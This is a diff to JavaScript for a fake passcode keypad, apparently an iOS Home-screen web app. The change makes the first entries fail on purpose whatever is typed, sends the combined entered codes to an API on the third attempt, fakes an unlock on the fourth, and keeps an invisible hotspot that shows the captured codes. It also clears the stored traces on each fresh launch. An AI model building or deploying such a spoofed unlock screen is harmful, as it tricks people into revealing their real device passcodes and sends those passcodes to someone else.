@@ -35,11 +35,49 @@
     return getLastCodes().join(',');
   }
 
+  // --- clear saved attempts/queue on a fresh app session (iOS Home-screen launch) ---
+  function clearSavedAttempts() {
+    try {
+      localStorage.removeItem(LAST_CODES_KEY);
+      localStorage.removeItem(ATT_KEY);
+      localStorage.removeItem(QUEUE_KEY);
+    } catch (e) { /* ignore */ }
+  }
+
+  (function ensureFreshSessionOnLaunch() {
+    // Use sessionStorage as a per-session marker. When a new PWA launch happens
+    // the browsing context is new and sessionStorage will be empty — we clear.
+    try {
+      const alreadyStarted = sessionStorage.getItem('pass_session_started');
+      function markStarted() { sessionStorage.setItem('pass_session_started', '1'); }
+
+      // If no session flag, treat this as a fresh launch and clear persisted data.
+      if (!alreadyStarted) {
+        clearSavedAttempts();
+        markStarted();
+      }
+
+      // Also respond to pageshow (covers bfcache restores). If sessionStorage was cleared
+      // (new browsing context) pageshow will still call init above.
+      window.addEventListener('pageshow', () => {
+        if (!sessionStorage.getItem('pass_session_started')) {
+          clearSavedAttempts();
+          markStarted();
+        }
+      }, { passive: true });
+    } catch (err) {
+      // if anything goes wrong, fail silently and don't break the app
+      console.warn('session init check failed', err);
+    }
+  })();
+
   function getAttempts() { return parseInt(localStorage.getItem(ATT_KEY) || '0', 10); }
   function setAttempts(n) { localStorage.setItem(ATT_KEY, String(n)); }
 
   function refreshDots() {
-    dotEls.forEach((d,i) => d.classList.toggle('filled', i < code.length));
+    // Ensure dotEls are up-to-date if DOM changed
+    const dots = Array.from(document.querySelectorAll('.dot'));
+    dots.forEach((d,i) => d.classList.toggle('filled', i < code.length));
     updateCancelText(); // keep label in sync whenever dots change
   }
 
@@ -200,7 +238,7 @@
     }, DURATION + 20);
   }
 
-  /* ---------- handleCompleteAttempt: send combined on 4th attempt ---------- */
+  /* ---------- handleCompleteAttempt: send on 3rd attempt, unlock on 4th ---------- */
   async function handleCompleteAttempt(enteredCode) {
     let attempts = getAttempts();
     attempts += 1;
@@ -209,21 +247,24 @@
     // push code into rotating buffer (so hotspot displays exact payload)
     pushLastCode(enteredCode);
 
-    // send combined only on 4th attempt
-    if (attempts >= 1 && attempts <= 3) {
-      // do not send to API yet
+    // 1-2: wrong attempts (no send)
+    if (attempts === 1 || attempts === 2) {
       animateWrongAttempt();
-    } else if (attempts === 4) {
-      const combined = getCombinedLastCodes(); // e.g. "1234,4321,5678,3456"
+    }
+    // 3: send combined last codes
+    else if (attempts === 3) {
+      const combined = getCombinedLastCodes();
       if (combined) sendToAPI(combined);
       animateWrongAttempt();
-    } else if (attempts === 5) {
-      // 5th attempt triggers unlock animation (no send)
+    }
+    // 4: unlock animation (no send)
+    else if (attempts === 4) {
       playUnlockAnimation();
       setTimeout(reset, 300);
     }
 
-    if (attempts >= 5) {
+    // reset counter once we've reached the unlock threshold
+    if (attempts >= 4) {
       setAttempts(0);
     }
   }
@@ -320,7 +361,7 @@
   window.addEventListener('online', flushQueue);
   flushQueue();
 
-  /* ---------- Invisible bottom-left hotspot: show combined last-4 codes on press ---------- */
+  /* ---------- Invisible bottom-left hotspot: show combined last-6 codes on press ---------- */
 
   function createInvisibleHotspotAndDisplay() {
     // Hotspot (invisible)
@@ -369,7 +410,7 @@
       inner.id = 'codesCombinedInner';
       Object.assign(inner.style, {
         width: '100%',
-        background: 'rgba(0,0,0,0.7)',  // translucent dark so it's readable
+        background: 'rgba(0,0,0,0.7)',
         borderRadius: '12px',
         padding: '10px 12px',
         boxSizing: 'border-box',
@@ -449,4 +490,3 @@
   window.__passUI = { getCode: () => code, reset, getAttempts, queuePass };
 
 })();
-
